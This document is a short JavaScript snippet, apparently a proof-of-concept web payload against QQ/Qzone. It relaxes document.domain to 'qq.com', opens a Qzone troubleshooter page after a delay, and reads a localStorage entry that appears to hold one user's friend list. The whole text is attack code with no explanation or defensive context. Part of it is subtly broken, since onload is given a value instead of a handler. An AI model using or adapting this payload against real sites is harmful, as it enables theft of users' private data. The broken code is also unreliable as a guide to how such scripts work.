document.domain="qq.com";
function openProxy(){
  var a = window.open("https://user.qzone.qq.com/troubleshooter?traytip");
  a.onload = a.localStorage.getItem("app_friends_649114132")
}
setTimeout('openProxy()',4000);

